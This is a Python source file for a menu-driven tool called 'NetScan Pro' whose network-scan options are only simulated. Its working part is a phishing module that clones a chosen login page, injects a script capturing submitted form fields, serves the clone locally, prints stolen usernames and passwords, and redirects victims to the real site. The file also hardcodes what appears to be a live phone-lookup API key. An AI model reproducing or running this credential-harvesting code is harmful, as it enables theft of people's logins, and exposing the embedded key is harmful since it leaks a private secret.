import os
import subprocess
import http.server
import socketserver
import threading
import numlookupapi
import time
import webbrowser
import requests
import urllib.parse as urlparse
import time
import json
import email
import email.policy
from io import BytesIO
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Função para limpar a tela do console
def clear_console():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

# Função para exibir a mensagem de boas-vindas
def welcome_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Welcome to the NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Bem-vindo à ferramenta NetScan Pro!".center(50))
    print()
    time.sleep(2)
    clear_console()

# Função para exibir a mensagem de despedida
def goodbye_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Thank you for using NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Obrigado por usar a ferramenta NetScan Pro!".center(50))
    time.sleep(3)
    print()

# Função para lidar com opções inválidas
def handle_invalid_option(language):
    clear_console()
    if language == '1':
        print(Fore.RED + "Invalid option. Please choose again.")
    else:
        print(Fore.RED + "Opção inválida. Por favor, escolha novamente.")
    time.sleep(2)

# Função para exibir a mensagem de carregamento
def loading_screen():
    print("Loading...")
    time.sleep(3)
    clear_console()
    print(Style.BRIGHT + "@wbrunnno".center(100))
    time.sleep(1)

# Função para atualizar a ferramenta do GitHub
def update_tool_from_github(language):
    clear_console()
    print(Fore.YELLOW + Style.BRIGHT + "Updating NetScan Pro tool from GitHub...")

    try:
        # Atualização usando Git
        subprocess.run(["git", "pull", "https://github.com/WeverttonBruno/NetScanPro.git"])
        print("NetScan Pro tool has been updated successfully!")

        # Reiniciando a ferramenta após a atualização
        print("Restarting NetScan Pro tool...")
        time.sleep(2)
        clear_console()
        print("NetScan Pro tool has been updated and restarted.")

        time.sleep(2)
    except Exception as e:
        print(Fore.RED + f"Error updating the tool: {e}")

    # Retorna ao menu principal após a atualização
    time.sleep(3)
    main_menu(language)

# Função para exibir o menu principal
def main_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Main Menu ".center(50, '-'))
            print("1. Network Tools")
            print("2. Social Engineering Tools")
            print("3. Update Tool")
            print("0. Exit")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu Principal ".center(50, '-'))
            print("1. Ferramentas de Rede")
            print("2. Ferramentas de Engenharia Social")
            print("3. Atualizar Ferramenta")
            print("0. Sair")

        choice = input("Choose an option: ")

        if choice == '0':
            goodbye_message(language)
            break
        elif choice == '1':
            network_tools_menu(language)
        elif choice == '2':
            social_engineering_tools(language)
        elif choice == '3':
            update_tool_from_github(language)
        else:
            handle_invalid_option(language)

# Função para o menu de ferramentas de rede
def network_tools_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Network Tools ".center(50, '-'))
            print("1. Scan a Network")
            print("2. Scan Own Network")
            print("3. Vulnerability Scanning")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Rede ".center(50, '-'))
            print("1. Escanear uma Rede")
            print("2. Escanear a Própria Rede")
            print("3. Escaneamento de Vulnerabilidades")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            enter_network(language)
            manual_mode(language)
        elif choice == '2':
            scan_own_network(language)
        elif choice == '3':
            vulnerability_scan_mode(language)
        else:
            handle_invalid_option(language)

# Função para entrar com o nome da rede
def enter_network(language):
    clear_console()
    if language == '1':
        return input("Enter the network name: ")
    else:
        return input("Digite o nome da rede: ")

# Função para o modo manual
def manual_mode(language):
    clear_console()
    if language == '1':
        print("Scanning network in manual mode...")
    else:
        print("Escanenado rede no modo manual...")

    # Lógica para o modo manual (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para escanear a própria rede
def scan_own_network(language):
    clear_console()
    if language == '1':
        print("Scanning own network...")
    else:
        print("Escanenando a própria rede...")

    # Lógica para escanear a própria rede (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o escaneamento de vulnerabilidades
def vulnerability_scan_mode(language):
    clear_console()
    if language == '1':
        print("Vulnerability scanning...")
    else:
        print("Escaneamento de vulnerabilidades...")

    # Lógica para o escaneamento de vulnerabilidades (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o menu de ferramentas de engenharia social
def social_engineering_tools(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Social Engineering Tools ".center(50, '-'))
            print("1. Phone Number Information")
            print("2. Phishing")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Engenharia Social ".center(50, '-'))
            print("1. Informações de Número de Telefone")
            print("2. Phishing")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            phone_number_info(language)
        elif choice == '2':
            phishing_menu(language)
        else:
            handle_invalid_option(language)

# Função para o submenu de phishing
def phishing_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Phishing Menu ".center(50, '-'))
            print("1. Fake Login Pages")
            print("0. Back to Social Engineering Tools")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu de Phishing ".center(50, '-'))
            print("1. Páginas de Logins Falsas")
            print("0. Voltar para Ferramentas de Engenharia Social")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            fake_login_pages(language)
        else:
            handle_invalid_option(language)
# Função para as páginas de logins falsas
def fake_login_pages(language):
    clear_console()
    if language == '1':
        print("Enter the URL of the website to clone for fake login:")
    else:
        print("Digite a URL do site para clonar para login falso:")

    url = input("URL: ")

    # Selecionar o servidor (apenas localhost implementado)
    server_choice = '1'

    clone_website(url, server_choice, language)

def clone_website(url, server_choice, language):
    clear_console()
    if language == '1':
        print(f"Cloning {url} for fake login...")
    else:
        print(f"Clonando {url} para login falso...")

    try:
        # Fazendo requisição GET para obter o conteúdo da página
        response = requests.get(url)
        if response.status_code == 200:
            # Parseando o conteúdo com BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            # Inject the capture script into the cloned HTML
            script = """
            <script>
                document.forms[0].addEventListener('submit', function(event) {
                    event.preventDefault();
                    var form = event.target;
                    var formData = new FormData(form);
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '/capture');
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = function() {
                        window.location = '""" + url + """';
                    };
                    var object = {};
                    formData.forEach((value, key) => object[key] = value);
                    xhr.send(JSON.stringify(object));
                });
            </script>
            """

           # Inject the script before the closing </body> tag, or inside <head> if <body> is None
            if soup.body:
                soup.body.append(BeautifulSoup(script, 'html.parser'))
            elif soup.head:
                soup.head.append(BeautifulSoup(script, 'html.parser'))
            else:
                # Adiciona a tag <head> se não existir
                head_tag = soup.new_tag('head')
                soup.insert(0, head_tag)
                head_tag.append(BeautifulSoup(script, 'html.parser'))

            html_content = soup.prettify()

            # Save the HTML and CSS content locally
            with open('index.html', 'w', encoding='utf-8') as html_file:
                html_file.write(html_content)

            print("HTML downloaded successfully!")

            # Continue to run the selected server (only localhost implemented)
            if server_choice == '1':
                run_local_server(url, language)

        else:
            print(f"Failed to clone {url}. Status code: {response.status_code}")

    except Exception as e:
        print(f"Error cloning website: {e}")

def run_local_server(target_url, language):
    clear_console()
    if language == '1':
        print("Running phishing site on localhost...")
    else:
        print("Executando site de phishing em localhost...")

    # Define the request handler
    class PhishingServer(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            try:
                if self.path == '/':
                    self.path = '/index.html'
                elif self.path == '/styles.css':
                    pass  # Implement logic to serve the CSS file

                # Serve the requested file
                with open(os.path.join('.', self.path[1:]), 'rb') as file:
                    self.send_response(200)
                    if self.path.endswith('.html'):
                        self.send_header('Content-type', 'text/html')
                    elif self.path.endswith('.css'):
                        self.send_header('Content-type', 'text/css')
                    self.end_headers()
                    self.wfile.write(file.read())

            except FileNotFoundError:
                self.send_error(404, 'File Not Found: %s' % self.path)

        def do_POST(self):
            # Capture the form data from POST request
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data)
            username = data.get('username', '')
            password = data.get('password', '')

            # Print the credentials to the console
            if language == '1':
                print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
                print(f"Username: {username}")
                print(f"Password: {password}")
            else:
                print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
                print(f"Nome de Usuário: {username}")
                print(f"Senha: {password}")

            # Redirect to the target URL after capturing the credentials
            self.send_response(302)
            self.send_header('Location', target_url)
            self.end_headers()

    try:
        # Start the server in a separate thread
        server = socketserver.TCPServer(('localhost', 8080), PhishingServer)
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()

        if language == '1':
            print("Server running at http://localhost:8080")
        else:
            print("Servidor rodando em http://localhost:8080")

        input("\nPress Enter to stop the phishing server and continue...")

        # After capturing credentials, stop the server
        server.shutdown()
        server.server_close()

        # Clean up the HTML and CSS files
        clean_up_files()

    except Exception as e:
        print(f"Error running local server: {e}")

def clean_up_files():
    try:
        os.remove('index.html')
        os.remove('styles.css')
    except Exception as e:
        print(f"Error cleaning up files: {e}")

# Função para informações de número de telefone
def phone_number_info(language):
    clear_console()
    if language == '1':
        print("Phone Number Information")
        print("Enter a phone number to obtain information (Country Code + Carrier area code):")
    else:
        print("Informações de Número de Telefone")
        print("Digite um número de telefone para obter informações(Código do País + DDD da operadora):")

    phone_number = input("Phone number: ")

    # Consulta à API numlookupapi para obter informações detalhadas
    try:
        client = numlookupapi.Client('num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy')  # Substitua 'YOUR-API-KEY' pelo seu API key
        result = client.validate(phone_number)
        
        # Formatando a resposta no estilo desejado
        print("\nInformation for phone number", phone_number)
        print("Valid:", result.get("valid", False))
        print("Number:", result.get("number", ""))
        print("Local Format:", result.get("local_format", ""))
        print("International Format:", result.get("international_format", ""))
        print("Country Prefix:", result.get("country_prefix", ""))
        print("Country Code:", result.get("country_code", ""))
        print("Country Name:", result.get("country_name", ""))
        print("Location:", result.get("location", ""))
        print("Carrier:", result.get("carrier", ""))
        print("Line Type:", result.get("line_type", ""))

    except Exception as e:
        print(Fore.RED + f"Error fetching phone number information: {e}")

    input("\nPress Enter to continue...")

# Inicialização do programa
if __name__ == "__main__":
    init(autoreset=True)  # Inicialização do colorama
    language = input("Choose language / Escolha o idioma:\n1. English\n2. Português\n\nChoice / Escolha: ")
    welcome_message(language)
    loading_screen()
    main_menu(language)